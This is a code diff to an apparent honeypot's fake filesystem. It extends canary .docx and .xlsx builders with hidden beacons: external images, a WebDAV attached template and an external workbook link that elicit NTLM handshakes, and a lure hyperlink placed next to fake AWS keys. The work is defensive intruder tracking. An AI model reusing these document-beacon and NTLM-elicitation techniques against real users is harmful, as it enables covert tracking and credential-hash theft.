@@ -25,6 +25,7 @@ import os
 import secrets
 import time
 import zipfile
+from xml.sax.saxutils import escape as _xml_escape
 from dataclasses import dataclass
 from datetime import datetime, timedelta, timezone
 from pathlib import PurePosixPath
@@ -34,6 +35,11 @@ from .fake_world import FakeWorld
 
 
 DEFAULT_CANARY_BASE = os.environ.get("HP_CANARY_URL", "")
+
+
+def html_escape(s: str) -> str:
+    """Escape a URL/string for safe inclusion in an XML attribute value."""
+    return _xml_escape(s or "", {'"': "&quot;"})
 
 
 @dataclass
@@ -984,25 +990,56 @@ class FakeFS:
                     m.mode = "drwx------"
 
     # ------------------- canary doc builders -------------------
-    def _build_canary_docx(self, session_id: str) -> bytes:
+    def _build_canary_docx(self, download_id: str) -> bytes:
         token = secrets.token_urlsafe(12)
-        beacon = (f"{self.canary_base}/{self.agent}/{session_id}/{token}.png"
-                   if self.canary_base else f"about:blank#{token}")
         v = self.v
+        base = self.canary_base
+
+        # Three independent beacons, each on its own slot so the receiver knows
+        # which fired and how far the attacker engaged:
+        #   img  — external image: fires when the doc is merely opened/previewed
+        #   wd   — attachedTemplate over WebDAV: fires when Word processes the
+        #          doc AND triggers the NTLM handshake (cleartext domain/user/
+        #          host + crackable hash on misconfigured Windows)
+        #   lnk  — hyperlink the user must click: fires only on deliberate
+        #          human interaction (strong "interested operator" signal)
+        if base:
+            beacon_img  = f"{base}/{self.agent}/{download_id}/img.{token}.png"
+            beacon_tmpl = f"{base}/dav/{self.agent}/{download_id}/{token}.dotx"
+            beacon_lnk  = f"{base}/{self.agent}/{download_id}/lnk.{token}.png"
+        else:
+            beacon_img = beacon_tmpl = beacon_lnk = f"about:blank#{token}"
+
         content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
 <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
 <Default Extension="xml" ContentType="application/xml"/>
 <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+<Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
 </Types>'''
         rels_root = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
 <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
 </Relationships>'''
+        # document.xml.rels: external image (rId100), settings (rId101),
+        # external hyperlink (rId102)
         rels_doc = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-<Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{beacon}" TargetMode="External"/>
+<Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{html_escape(beacon_img)}" TargetMode="External"/>
+<Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
+<Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{html_escape(beacon_lnk)}" TargetMode="External"/>
 </Relationships>'''
+        # settings.xml.rels: the attachedTemplate over WebDAV (NTLM elicitation)
+        rels_settings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rIdTpl" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{html_escape(beacon_tmpl)}" TargetMode="External"/>
+</Relationships>'''
+        settings_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+<w:attachedTemplate r:id="rIdTpl"/>
+<w:updateFields w:val="true"/>
+</w:settings>'''
         document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
@@ -1023,6 +1060,8 @@ class FakeFS:
 <w:p><w:r><w:t xml:space="preserve">  access_key: {v['aws_key2']}</w:t></w:r></w:p>
 <w:p><w:r><w:t xml:space="preserve">  secret_key: {v['aws_secret2']}</w:t></w:r></w:p>
 <w:p/>
+<w:p><w:r><w:t xml:space="preserve">Full rotation runbook (click to open): </w:t></w:r>
+<w:hyperlink r:id="rId102"><w:r><w:rPr><w:rStyle w:val="Hyperlink"/></w:rPr><w:t>vault-rotation-runbook.pdf</w:t></w:r></w:hyperlink></w:p>
 <w:p><w:r><w:drawing>
 <wp:inline distT="0" distB="0" distL="0" distR="0">
 <wp:extent cx="2381250" cy="1190625"/>
@@ -1045,13 +1084,19 @@ class FakeFS:
             z.writestr("[Content_Types].xml", content_types)
             z.writestr("_rels/.rels", rels_root)
             z.writestr("word/_rels/document.xml.rels", rels_doc)
+            z.writestr("word/_rels/settings.xml.rels", rels_settings)
+            z.writestr("word/settings.xml", settings_xml)
             z.writestr("word/document.xml", document_xml)
         return buf.getvalue()
 
-    def _build_canary_xlsx(self, session_id: str) -> bytes:
+    def _build_canary_xlsx(self, download_id: str) -> bytes:
         token = secrets.token_urlsafe(12)
-        beacon = (f"{self.canary_base}/{self.agent}/{session_id}/{token}.png"
-                   if self.canary_base else f"about:blank#{token}")
+        base = self.canary_base
+        if base:
+            beacon_img = f"{base}/{self.agent}/{download_id}/img.{token}.png"
+            beacon_ext = f"{base}/dav/{self.agent}/{download_id}/{token}.xlsx"
+        else:
+            beacon_img = beacon_ext = f"about:blank#{token}"
         content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
 <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
@@ -1059,6 +1104,7 @@ class FakeFS:
 <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
 <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
 <Override PartName="/xl/drawings/drawing1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawing+xml"/>
+<Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>
 </Types>'''
         rels_root = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
@@ -1067,6 +1113,7 @@ class FakeFS:
         wb_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
 <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+<Relationship Id="rIdExt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/>
 </Relationships>'''
         sheet_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
@@ -1074,12 +1121,25 @@ class FakeFS:
 </Relationships>'''
         drawing_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{beacon}" TargetMode="External"/>
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{html_escape(beacon_img)}" TargetMode="External"/>
 </Relationships>'''
+        # External-link beacon: a reference to an external workbook over WebDAV.
+        # When Excel updates links it fetches this → NTLM handshake.
+        extlink_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="{html_escape(beacon_ext)}" TargetMode="External"/>
+</Relationships>'''
+        extlink_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+              xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+<externalBook r:id="rId1"><sheetNames><sheetName val="Master"/></sheetNames>
+<sheetDataSet><sheetData sheetId="0"><row r="1"><cell r="A1"><v>1</v></cell></row></sheetData></sheetDataSet>
+</externalBook></externalLink>'''
         workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
           xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 <sheets><sheet name="Customers" sheetId="1" r:id="rId1"/></sheets>
+<externalReferences><externalReference r:id="rIdExt"/></externalReferences>
 </workbook>'''
         rows_xml = []
         rows_xml.append(
@@ -1101,6 +1161,12 @@ class FakeFS:
                 f'<c r="D{i}" t="inlineStr"><is><t>{c["plan"]}</t></is></c>'
                 f'<c r="E{i}"><v>{c["mrr_usd"]}</v></c>'
                 f'</row>')
+        # A formula cell that consumes the external link so Excel offers to
+        # "update links" (which triggers the WebDAV/NTLM fetch).
+        rows_xml.append(
+            f'<row r="{len(self.v.get("customers", [])) + 3}">'
+            f'<c r="A{len(self.v.get("customers", [])) + 3}" t="str">'
+            f"<f>[1]Master!A1</f><v>1</v></c></row>")
         sheet1 = (f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
@@ -1131,6 +1197,8 @@ class FakeFS:
             z.writestr("xl/_rels/workbook.xml.rels", wb_rels)
             z.writestr("xl/worksheets/_rels/sheet1.xml.rels", sheet_rels)
             z.writestr("xl/drawings/_rels/drawing1.xml.rels", drawing_rels)
+            z.writestr("xl/externalLinks/_rels/externalLink1.xml.rels", extlink_rels)
+            z.writestr("xl/externalLinks/externalLink1.xml", extlink_xml)
             z.writestr("xl/workbook.xml", workbook)
             z.writestr("xl/worksheets/sheet1.xml", sheet1)
             z.writestr("xl/drawings/drawing1.xml", drawing1)
